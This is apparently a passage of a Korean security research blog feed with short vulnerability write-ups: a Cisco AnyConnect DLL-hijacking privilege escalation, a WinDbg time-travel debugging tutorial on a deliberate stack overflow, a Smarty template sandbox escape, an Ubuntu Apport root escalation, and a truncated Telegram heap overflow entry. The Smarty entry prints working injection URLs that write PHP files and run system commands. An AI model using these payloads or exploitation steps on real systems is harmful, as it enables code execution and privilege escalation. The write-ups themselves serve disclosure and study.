      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>heap buffer overflow</tag>
      
      <tag>windows defender</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1366: Cisco AnyConnect Posture(HostScan) Local Privilege Escalation</title>
    <link href="/2021/02/22/idioth/2021-02-22/"/>
    <url>/2021/02/22/idioth/2021-02-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.coresecurity.com/core-labs/articles/analysis-cisco-anyconnect-posture-hostscan-local-privilege-escalation-cve-2021">Analysis of Cisco AnyConnect Posture (HostScan) Local Privilege Escalation: CVE-2021-1366</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Cisco AnyConnect Posture 4.9.05042 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Cisco AnyConnect Posture에서 DLL 하이재킹을 통한 권한 상승 취약점이 발견되었습니다. Cisco AnyConnect Posture는 AnyConnect Secure Mobility Client에서 선택하여 설치할 수 있는 모듈입니다. 해당 모듈을 사용하면 VPN 클라이언트가 호스트에 설치된 운영 체제, 안티 바이러스, 안티 스파이웨어, 방화벽을 식별할 수 있습니다.</p><p>AnyConnect Posture(ciscod.exe)의 Cisco Security Service Windows 서비스는 localhost 1023 포트에서 로컬 peer의 연결을 대기합니다. 로컬 peer가 연결되면, <code>lphlpapi.dll</code> 라이브러리의 <code>GetExtendedTcpTable</code> 함수를 통해 로컬 클라이언트의 PID에 해당하는 실행 파일을 찾습니다. 그 후 연결된 프로세스가 “Cisco System, Inc” 서명을 가졌는지 확인합니다.</p><p>서명 검사를 통과하면, 특정 포맷으로 된 패킷을 통해 명령어를 처리합니다. <code>process_ipc_message</code> 함수에서 패킷의 첫 4바이트가 0x2E24인지 확인한 후, 다음 4바이트가 유효한 명령어인지 확인합니다.</p><p>이 중 <code>priv_file_copy</code> 명령어는 모든 위치에서 <code>%ProgramFiles(x86)%\Cisco\Cisco HostScan</code> 디렉터리 내의 서브 디렉터리로 파일을 복사할 수 있습니다. directory traversal을 검사하므로, source file은 <code>\Cisco\Cisco HostScan</code> 디렉터리 내부에 위치하여야 합니다. 이를 통해 원하는 DLL을 복사하여, 서비스가 시작될 때 해당 DLL을 실행할 수 있습니다.</p><p>해당 취약점을 악용하기 위해 일반 유저가 서비스를 중지/시작할 수 없으므로, 재부팅 없이 권한 상승을 수행하기 위해 <code>priv_get_device_id</code> 명령을 사용합니다. 서비스가 이 명령어를 받으면, <code>/lib</code> 디렉터리에서 <code>libhostscan.dll</code> 라이브러리 로드를 시도합니다. <code>libhostscan.dll</code> 라이브러리는 자신의 location path에 위치하지 않는 여러 DLL을 로드합니다.(ex. IPHLPAPI.DLL)</p><p>LPE를 트리거하는 과정은 다음과 같습니다.</p><ol><li><code>libhostscan.dll</code> 라이브러리가 어디에 위치하는지 확인하고 <code>%TEMP%\Cisco\Cisco HostScan</code> 디렉터리에 복사합니다. 라이브러리는 <code>%ProgramFiles(x86)%\Cisco\Cisco HostScan\lib</code>이나 <code>%ProgramFile(x86)%\Cisco\Cisco AnyConnect Secure Mobility Client\Posture</code> 디렉터리에 있습니다.</li><li>서비스의 실행 파일(ciscod.exe)을 일시 중지합니다.</li><li>일시 중지된 프로세스에 <a href="https://attack.mitre.org/techniques/T1055/012/">process hollowing</a>을 수행하고 아래의 세 명령어를 127.0.0.1:1023으로 보내는 프로세스로 바꿉니다.<ul><li><code>%TEMP%\Cisco\Cisco HostScan</code> 디렉터리에서 <code>%PROGRAMFILES(x86)%\Cisco\Cisco HostScan\lib</code> 디렉터리로 <code>libhostscan.dll</code>를 복사하는 <code>priv_file_copy</code> 명령어(라이브러리가 존재하면 overwrite 됩니다.)</li><li><code>%TEMP%\Cisco\Cisco HostScan</code> 디렉터리에서 <code>PROGRAMFILES(x86)%\Cisco\Cisco HostScan\lib</code> 디렉터리로 공격자가 제어하는 DLL을 복사하는 <code>priv_file_copy</code> 명령어(해당 DLL의 이름은 IPHLPAPI.DLL이고, 원본 DLL의 export function을 동일하게 export 해야 합니다.)</li><li><code>priv_get_device_id</code> 명령어</li></ul></li><li>일시 중지 상태에서 다시 시작시킵니다.</li></ol><p>해당 취약점은 <code>priv_file_copy</code> 명령에 디지털 서명 확인을 추가함으로써 패치되었습니다. POC는 <a href="https://www.coresecurity.com/core-labs/articles/analysis-cisco-anyconnect-posture-hostscan-local-privilege-escalation-cve-2021">coresecurity 블로그의 해당 게시글</a>에서 확인하실 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>idioth</tag>
      
      <tag>process hollowing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 시간을 여행하는 해커를 위한 안내서 Part2</title>
    <link href="/2021/02/21/fabu1ous/ttd-2/"/>
    <url>/2021/02/21/fabu1ous/ttd-2/</url>
    
    <content type="html"><![CDATA[<h1 id="Part-II-두둥-등장"><a href="#Part-II-두둥-등장" class="headerlink" title="Part II 두둥 등장"></a>Part II 두둥 등장</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/1.png"></p><p>시간을 여행하는 해커를 위한 안내서 Part 1에서 Windbg TTD를 간단히 살펴봤습니다. 이번 Part 2에선 TTD를 사용해 간단한 버그의 root cause를 찾아보면서 TTD와 친해져 봅시다. Windbg를 한 번도 안 써보셨거나 Part 1을 보고 싶으신 분들은 <a href="https://hackyboiz.github.io/2021/01/24/fabu1ous/ttd-1/">Part 1</a>을 보고 오세요.</p><p>최근에 L0ch형이 글 조회수로 절 놀리더라고요. 도와주십쇼. ㅎㅎ</p><h1 id="준비물-필수"><a href="#준비물-필수" class="headerlink" title="준비물(필수)"></a>준비물(필수)</h1><ol><li>visual studio</li><li>windbg preview</li><li>리버싱 처음 해보는 척할 수 있는 연기력</li></ol><h1 id="샘플-만들기"><a href="#샘플-만들기" class="headerlink" title="샘플 만들기"></a>샘플 만들기</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/2.png"></p><p>Visual studio로 C++ 콘솔 app을 만들어 실습 샘플을 만들어 보겠습니다. 프로젝트의 이름 및 실행파일의 이름은 ttd_part2로 하겠습니다.</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GetCppConGreeting</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* <span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">wchar_t</span> <span class="hljs-keyword">const</span>* <span class="hljs-keyword">const</span> message = <span class="hljs-string">L&quot;HELLO FROM THE WINDBG TEAM. GOOD LUCK IN ALL OF YOUR TIME TRAVEL DEBUGGING!&quot;</span>;    wcscpy_s(<span class="hljs-built_in">buffer</span>, <span class="hljs-built_in">size</span>, message);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span> &lt;<span class="hljs-keyword">wchar_t</span>, 50&gt; greeting&#123;&#125;;    GetCppConGreeting(greeting.data(), <span class="hljs-keyword">sizeof</span>(greeting));    wprintf(<span class="hljs-string">L&quot;%ls\\n&quot;</span>, greeting.data());    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>실습에 사용할 버그의 코드입니다. greeting.data()에 문자열을 복사하고 출력하는 간단한 예제입니다. 대충 코드만 봐도 어떤 버그가 발생할지 느낌이 오지만 가볍게 무시합시다.</p><blockquote><p>Part2는 신비주의야! Part2는 혼자밖에 생각하지 않아!</p><p>-이근-</p></blockquote><p><img src="/2021/02/21/fabu1ous/ttd-2/3.png"></p><p>우선 위 코드를 빌드하기 전, 실습에 방해되는 보호 기법과 보안설정을 꺼줍시다.</p><p>상단 메뉴 &gt; 프로젝트 &gt; 속성 &gt; C/C++ &gt; SDL 검사 &gt; 아니요(/sdl-)</p><p><img src="/2021/02/21/fabu1ous/ttd-2/4.png"></p><p>상단 메뉴 &gt; 프로젝트 &gt; 속성 &gt; C/C++ &gt; 코드 생성</p><ul><li>기본 런타임 검사 : 기본값</li><li>보안 검사 : 보안 검사 사용 안함 (/GS-)</li></ul><p><img src="/2021/02/21/fabu1ous/ttd-2/build.png"></p><p>상단 메뉴 &gt; 빌드 &gt; 솔루션 빌드</p><p>빌드 후 ttd_part2.exe를 실행해 보면 위 사진과 같이 문자열 하나가 출력됩니다. 실습 환경에 따라 Exception이나 Crash가 발생했다는 메세지 박스가 뜰 수도 있습니다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/5.png"></p><p>Windbg Preview를 tdd_part2.exe에 붙여서 실행해보면 Access violation이 발생한다는 것을 확인할 수 있습니다. 간단히 살펴보면 EIP가 오염돼 있군요. </p><h1 id="Trace-File-만들기"><a href="#Trace-File-만들기" class="headerlink" title="Trace File 만들기"></a>Trace File 만들기</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/6.png"></p><p>Windbg Preview (관리자 권한) &gt; 파일 &gt; Launch executable (advanced) &gt;</p><p>타겟(ttd_part2.exe) 선택 &gt; Record with TTD 체크 &gt; Configuer and Record</p><p>이제 만들어둔 샘플로 본격적인 실습을 시작해 봅시다. TTD사용의 첫 단계인 Trace File 녹화를 해봅시다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/7.png"></p><p>Part 1에서 저 Record 버튼을 누르고 최대한 빨리 분석하고자 하는 이슈를 발생시켜야 한다고 했었죠? ttd_part2.exe는 실행만 시켜도 크래쉬가 발생하기 때문에 Record 버튼을 눌러 주시기만 하면 됩니다. 딱히 추가로 신경 써 줄게 없습니다. </p><p><img src="/2021/02/21/fabu1ous/ttd-2/8.png"></p><p>녹화가 끝나고 TTD가 Trace file(<code>.run</code>)에 대한 IDX file(.idx)을 자동으로 생성하고 나면 분석 준비 끝!</p><h1 id="Trace-File-분석하기"><a href="#Trace-File-분석하기" class="headerlink" title="Trace File 분석하기"></a>Trace File 분석하기</h1><pre><div class="caption"><span>text</span></div><code class="hljs plain">dx -r1 @$curprocess.TTD.Events</code></pre><p>dx 명령어를 사용해 Trace File에 녹화된 모든 이벤트 목록을 확인해 봅시다. tdd_part2.exe가 실행되면서 발생한 큼직 큼직한 사건들을 한눈에 볼 수 있습니다. 일단 Exception이 눈에 띄네요.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/9.png"></p><p>좌측에 있는 Index(<code>[0x9]</code>)를 클릭해 Exception에 대한 정보를 출력해 봅시다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/10.png"></p><p>Time Travel Position, Exception Code, Exception Type 등 Exception에 대한 간단한 정보를 출력해 줍니다. 저희가 분석하려는 이슈는 Program Counter가 <code>0x540020</code>일 때 CPU가 던진 하드웨어 Exception으로 Access Violation에 해당함을 알 수 있습니다.</p><p>조금 더 자세한 정보를 원하시면 Exception 필드를 클릭해 Flag, RecordAddress 등의 정보도 볼 수 있습니다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/10-1.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">!tt ce:0</code></pre><p>[ Time Travel ]를 클릭하거나 <code>!tt</code>명령어를 사용해 해당 Exception이 발생한 시점으로 이동해 본격적으로 분석을 시작해 봅시다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/12.png"></p><p>버그나 취약점을 분석할 때 대부분 제일 먼저 확인하게 되는 건 레지스터의 상태입니다. 일단 눈에 들어오는 게 2가지 있네요.</p><ol><li>EIP(Program Counter)의 위치가 이상하다.</li><li>ESP와 EBP의 거리가 너무 멀다.</li></ol><p>크래쉬 시점이 root cause일리 없으니 EIP가 오염되기 전으로 되돌리면서 root cause를 찾아봅시다.</p><p>네?  저 두 개만 봐도 스택 오버플로우인 거 알 거 같다고요? 글 초반부에 적어 놓은 3번째 준비물을 다시 준비해오시면 되겠습니다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/13.png"></p><p>Part 1에서 다뤘던 것처럼 TTD를 사용해 프로그램의 실행을 되돌리는 방법은 많지만 “천 리 길도 한 걸음 부터”라는 말이 있듯이 우선 Step Into Back(명령어 “t-“)을 사용해 한 걸음(Step)씩 되감아 봅시다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/14.png"></p><p>허허… 시작이 반이라고 크래쉬 직전에 실행한 인스트럭션이 <code>main()</code>의 ret이네요. EIP가 오염된 이유를 찾았습니다. 벌써 분석 다한 거 같은 이 기분! 너무 홀가분하군요.</p><blockquote><p>디버거에게는 작은 한 걸음이지만 리버서에게는 위대한 도약이다.</p><p>-닐 암스트롱-</p></blockquote><p>아마 ESP와 EBP의 거리가 먼 이유도 <code>main()</code>의 에필로그를 실행하다가 EBP가 이상한 위치로 튀어버린거겠죠?</p><p><img src="/2021/02/21/fabu1ous/ttd-2/15.png"></p><p>Step Into Back(“t-“)을 2번 더 해줍니다. 이제야 EBP 위치가 말이 되네요.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/16.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">dc ebp</code></pre><p>ebp 위치를 기준으로 메모리 상태를 살펴보면 SFP와 RET 값이 출력 메세지로 오염된 것을 확인할 수 있습니다. 분명히 <code>main()</code> 어딘가에서 출력 메세지가 stack을 오염시킨다는 걸 알았으니 그 이유를 알아봅시다.</p><pre><div class="caption"><span>text</span></div><code class="hljs plain">ba &lt;access&gt; &lt;size&gt; &lt;address&gt; &#123;option&#125;</code></pre><p>방금까지 걷는 법을 알아봤으니 이젠 Breakpoint를 사용해 뛰는 법을 배워봅시다. Windbg의 breakpoint는 특정 메모리에 접근할 때 걸리도록 만들 수 있습니다.</p><ul><li>e : Execute</li><li>r : Read or Write</li><li>w : Write</li></ul><p>현재 EBP가 가리키고 있는 메모리 위치(저의 경우에는 0x113fab4)에 Write access가 발생할 때 걸리는 breakpoint를 걸어야 합니다.</p><pre><div class="caption"><span>text</span></div><code class="hljs plain">ba w4 0113fab4</code></pre><p><img src="/2021/02/21/fabu1ous/ttd-2/17.png"></p><p>Breakpoint를 걸고 Go Back(명령어 “g-“)를 해봅시다. <code>ucrtbased!common_tcscpy_s&lt;wchar_t&gt;+0x187</code>에 되감기가 멈추네요.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/18.png"></p><p>스택의 상황을 살펴봅시다.</p><p>main() → GetCppGreeting() → wcscpy_s()</p><p><code>main()</code>의 스택 프레임이 망가졌으니 저희가 작성한 <code>GetCppConGreeting()</code>에 root cause가 있을 확률이 높습니다.</p><p>이 시점에서 개발자라면 <code>GetCppConGreeting()</code>의 코드를 열어 볼테고, 저같이 버그 바운티가 목적이라면 IDA를 사용해 정적 분석을 하겠지만 TTD에 집중하기 위해 좀 더 TTD를 써봅시다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/19.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">dx &amp;ttd_part2!GetCppConGreetingbu &amp;ttd_part2!GetCppConGreeting</code></pre><p>버그가 발생할 거라 의심되는 <code>GetCppGreeting()</code>의 시작 주소에 breakpoint를 걸고</p><p><img src="/2021/02/21/fabu1ous/ttd-2/20.png"></p><p>아까 스택이 오염되는 시점을 찾기 위해 걸어줬던 breakpoint는 삭제해줍시다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/21.png"></p><p>그리고 프로그램 시작 지점으로 돌아가 Go(명령어 “g”)를 통해 <code>GetCppConGreeting()</code>의 프롤로그로 이동해줍시다. EAX가 눈에 들어오는데 아마 저기가 출력 문자열이 복사되는 Destination이겠죠?</p><p><img src="/2021/02/21/fabu1ous/ttd-2/22.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">gu</code></pre><p><code>GetCppConGreeting()</code>이 실행을 마치고 다시 <code>main()</code>으로 리턴한 직후 위에서 확인했던 EAX 위치를 살펴보면 예상했던 것처럼 Destination이 맞습니다. <code>GetCppConGreeting()</code>의 다른 파라미터들을 확인해 보면 root cause를 찾을 수 있을 거 같군요.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/23.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">!tt 0gg-uub eip</code></pre><p>다시<code>GetCppConGreeting()</code>의 호출 시점으로 이동한 후 “g-u”를 사용해 호출 직전으로 되돌려줍니다. 여기서 현재 EIP를 기준으로 어떤 인스트럭션들을 실행했는지 확인해 보면 <code>GetCppConGreeting( [EAX], 0x64 )</code>, 즉 아까 확인했던 Destination과 0x64(100)가 파라미터인걸 알 수 있습니다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/24.png"></p><p><img src="/2021/02/21/fabu1ous/ttd-2/25.png"></p><p>만약 심볼이 살아있는 실행파일을 분석 중이라면 상단 메뉴 &gt; Watch 레이블을 사용해 조금 더 쉽게 확인할 수 있습니다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/26.png"></p><p><img src="/2021/02/21/fabu1ous/ttd-2/27.png"></p><p><code>GetCppConGreeting()</code>의 첫 번째 파라미터 dest_buf(<code>0x113fa50</code>)를 살펴봅시다. 크기는 100 bytes 네요? 100 bytes 버퍼에 size 100 만큼 문자열을 복사하는 듯한데 왜 버그가 발생하는 걸까요? 설령 Stack overflow가 발생해도 SFP만 오염되야 할 상황 같은데 RET이 오염될 이유는 없어 보입니다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/28.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">uf ttd_part2!GetCppConGreeting</code></pre><p><code>GetCppConGreeting()</code> 함수의 인스트럭션들을 살펴봅시다. 문자열을 복사할 때 Wide character를 사용하는 함수<code> wcscpy_s()</code>를 사용하는군요. 즉 100 bytes 버퍼에 100 bytes 복사가 이루어지는 것이 아니라 200 bytes(wchar_t 100개) 복사가 이루어집니다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/29.png"></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">gudc 0113fa50</code></pre><p>따라서 위 사진에서 볼 수 있듯이 100 bytes 버퍼를 넘어서 하이라이트 된 SFP와 RET까지 오염됩니다.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/29-1.png"></p><p>찾았다! Root Cause!</p><h1 id="Part-III-예고"><a href="#Part-III-예고" class="headerlink" title="Part III 예고"></a>Part III 예고</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/31.png"></p><p>원래는 TTD를 버그 바운티에 사용해보면서 느낀 점이나 꿀팁 등을 정리해 올릴 생각이었는데 최근에 버그 바운티를 거의 안 해서 상황을 좀더 지켜봐야 할 것 같습니다. 그리고 이번 글을 작성하면서 <code>dx</code>명령어와 TTD.Memory object를 같이 쓰는 방법도 공부를 해봤는데 엄청 좋더라고요.</p><p>다음 part 3는</p><ol><li>TTD 버그 바운티에 사용해보기</li><li>고오급 사용법</li></ol><p>이 둘 중 하나를 들고 오겠습니다.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windbg</tag>
      
      <tag>time travel debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Smarty Template Engine Sandbox escape</title>
    <link href="/2021/02/20/fabu1ous/2021-02-20/"/>
    <url>/2021/02/20/fabu1ous/2021-02-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html">Smarty Template Engine Sandbox escape PHP Code Injection</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Smarty Endgine &lt;= 3.1.38</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Smarty는 PHP용 template engine입니다. Smarty는 presentation(html/css)과 app logic을 분리시키는 PHP insulation(sandbox)을 통해 injection 공격의 피해범위를 제한합니다. 하지만 Template injection이 가능할 때 sandbox escape를 할 수 있는 취약점이 발견되었습니다.</p><ul><li>CVE-2021-26119</li></ul><p>super global 변수 <code>$smarty.template_object</code>를 이용한  Template injection이 가능할 때 Smarty의 인스턴스에 접근할 수 있습니다. <code>compile</code>함수가 <code>&#123;$poc=$smarty.template_object&#125;</code>와 같은 값을 받으면 <code>$poc</code>에 <code>Smarty_Internal_Template</code> 객체를 할당합니다.</p><pre><code class="hljs csharp"><span class="hljs-keyword">object</span>(Smarty_Internal_Template)<span class="hljs-meta">#7 (24) &#123;  </span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;_objType&quot;</span></span>]=&gt;  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)    [<span class="hljs-meta"><span class="hljs-meta-string">&quot;smarty&quot;</span></span>]=&gt;  &amp;<span class="hljs-keyword">object</span>(Smarty)<span class="hljs-meta">#1 (76) &#123; ... &#125;</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;source&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty_Template_Source)<span class="hljs-meta">#8 (16) &#123; ... &#125;</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;parent&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty)<span class="hljs-meta">#1 (76) &#123; ... &#125;</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;ext&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty_Internal_Extension_Handler)<span class="hljs-meta">#10 (4) &#123; ... &#125;</span>  [<span class="hljs-meta"><span class="hljs-meta-string">&quot;compiled&quot;</span></span>]=&gt;  <span class="hljs-keyword">object</span>(Smarty_Template_Compiled)<span class="hljs-meta">#11 (12) &#123; ... &#125;</span></code></pre><p>위는 <code>Smarty_Internal_Template</code>객체입니다. 해커는 <code>[&quot;smarty&quot;]</code>또는 <code>[&quot;parent&quot;]</code> 값을 사용해 Smarty의 인스턴스에 접근할 수 있고 arbitrary file write로 공격 범위를 확장할 수 있습니다.</p><pre><code class="hljs URL">http:&#x2F;&#x2F;localhost:8000&#x2F;page.php?poc&#x3D;string:&#123;$s&#x3D;$smarty.template_object-&gt;smarty&#125;&#123;$fp&#x3D;$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;</code></pre><ul><li>CVE-2021-26120</li></ul><p>template syntax를 컴파일하는 과정에서 <code>Smarty_Internal_Runtime_TPlFunction</code>클래스는 attacker controlled data인 <code>name</code>을 필터링하지 않아 함수 인젝션을 할 수 있습니다.</p><pre><code class="hljs javascript"><span class="hljs-comment">/* input = &#123;function name=&#x27;test&#x27;&#125;&#123;/function&#125; */</span><span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&#x27;smarty_template_function_test_8782550315ffc7c00946f78_05745875&#x27;</span>)) &#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">smarty_template_function_test_8782550315ffc7c00946f78_05745875</span>(<span class="hljs-params">Smarty_Internal_Template $_smarty_tpl,$params</span>) </span>&#123;    foreach ($params <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;            $_smarty_tpl-&gt;tpl_vars[$key] = <span class="hljs-keyword">new</span> Smarty_Variable($value, $_smarty_tpl-&gt;isRenderingCache);        &#125;    &#125;&#125;</code></pre><p>입력 <code>&#123;function name=&#39;test&#39;&#125;&#123;/function&#125;</code>을 받은 컴파일러는 위와 같은 코드를 생성합니다. </p><pre><code class="hljs URL">http:&#x2F;&#x2F;localhost:8000&#x2F;page.php?poc&#x3D;string:&#123;function+name&#x3D;&#39;rce()&#123;&#125;;system(&quot;id&quot;);function+&#39;&#125;&#123;&#x2F;function&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>sandbox</tag>
      
      <tag>php</tag>
      
      <tag>injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Ubuntu 크래시 핸들러 Apport의 Local Privilege Escalation 취약점</title>
    <link href="/2021/02/19/l0ch/2021-02-19/"/>
    <url>/2021/02/19/l0ch/2021-02-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://alephsecurity.com/2021/02/16/apport-lpe/">Exploiting crash handlers: LPE on Ubuntu</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Ubuntu 20.10 - 2.20.11-0ubuntu50.5 이전</p><p>Ubuntu 20.04 - 2.20.11-0ubuntu27.16 이전</p><p>Ubuntu 18.04 - 2.20.9-0ubuntu7.23 이전</p><p>Ubuntu 16.04 - 2.20.1-0ubuntu2.30 이전</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ubuntu의 크래시 핸들러인 Apport에서 로컬 권한 상승 취약점이 발견되었습니다. Apport는 실행 중인 프로세스의 크래시 발생 정보를 수집하고 크래시 리포트를 만드는 서비스입니다.</p><p>Apport는 표준 입력에서 코어 덤프를 읽어 프로세스의 현재 디렉터리에 있는 코어 덤프에 새로 쓰는 <code>write_user_coredump()</code> 함수를 사용합니다. <code>write_user_coredump()</code> 를 호출하기 전 <code>drop_privileges()</code> 함수를 호출해 기존 Apport의 루트 권한을 크래시가 발생한 프로세스의 uid와 gid로 변경해 해당 프로세스 권한으로 코어 덤프를 작성합니다.</p><p>이때 <code>get_pid_info()</code> 함수는 <code>/proc/pid/status</code> 파일에서 uid와 gid를 각각 <code>Uid:</code> 및 <code>Gid:</code>로 시작하는 행에서 파싱 합니다. 이를 이용해 프로세스 이름을 <code>a\rUid: 0\rGid: 0</code> 로 생성한 뒤 크래시를 발생시키면 uid 및 gid가 0으로 설정되므로 <code>drop_privileges()</code> 함수 호출을 우회하여 루트 권한을 유지할 수 있습니다.</p><p>위 취약점은 CVE-2021-25682를 할당받았으며 Apport의 크래시 발생 이후 프로세스의 교체 검사 우회 취약점(<a href="https://alephsecurity.com/vulns/aleph-2021001">CVE-2021-25683</a>) 및 서비스 거부 취약점(<a href="https://alephsecurity.com/vulns/aleph-2021002">CVE-2021-25684</a>)과 같이 악용되면 코어 덤프에 리버스 쉘 페이로드를 작성할 수 있어 root 권한으로 임의 코드 실행이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>ubuntu</tag>
      
      <tag>local privilege escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] heap out-of-bounds write in Telegrams animated stickers</title>
    <link href="/2021/02/18/idioth/2021-02-18/"/>
    <url>/2021/02/18/idioth/2021-02-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.shielder.it/blog/2021/02/hunting-for-bugs-in-telegrams-animated-stickers-remote-attack-surface/">Hunting for bugs in Telegram’s animated stickers remote attack surface</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>텔레그램 안드로이드 v7.1.0(2090) (2020년 9월 30일 릴리스) 이전 버전</li><li>텔레그램 iOS v7.1 (2020년 9월 30일 릴리스) 이전 버전</li><li>텔레그램 macOS v7.1 (2020년 10월 2일 릴리스) 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>텔레그램 비밀 채팅 애니메이션 스티커 기능에서 remote code execution이 가능한 취약점이 발견되었습니다. 텔레그램은 애니메이션 스티커를 렌더링 하기 위해서 rlottie를 수정하여 사용합니다.</p><p>취약점은 <code>VGradientCache::generateGradientColorTable</code>에 존재하며, 반복문의 범위 검증 미흡으로 heap memory out-of-bound write이 발생합니다.</p><pre><code class="hljs angelscript"><span class="hljs-built_in">bool</span> VGradientCache::generateGradientColorTable(<span class="hljs-keyword">const</span> VGradientStops &amp;stops,                                                <span class="hljs-built_in">float</span>                 opacity,                                                <span class="hljs-built_in">uint</span>32_t *colorTable, <span class="hljs-built_in">int</span> size)&#123;    <span class="hljs-built_in">int</span>                  dist, idist, pos = <span class="hljs-number">0</span>, i;    <span class="hljs-built_in">bool</span>                 alpha = <span class="hljs-literal">false</span>;    <span class="hljs-built_in">int</span>                  stopCount = stops.size();    <span class="hljs-keyword">const</span> VGradientStop *curr, *next, *start;    <span class="hljs-built_in">uint</span>32_t             curColor, nextColor;    <span class="hljs-built_in">float</span>                delta, t, incr, fpos;    <span class="hljs-keyword">if</span> (!vCompare(opacity, <span class="hljs-number">1.0f</span>)) alpha = <span class="hljs-literal">true</span>;    start = stops.data();    curr = start;    <span class="hljs-keyword">if</span> (!curr-&gt;second.isOpaque()) alpha = <span 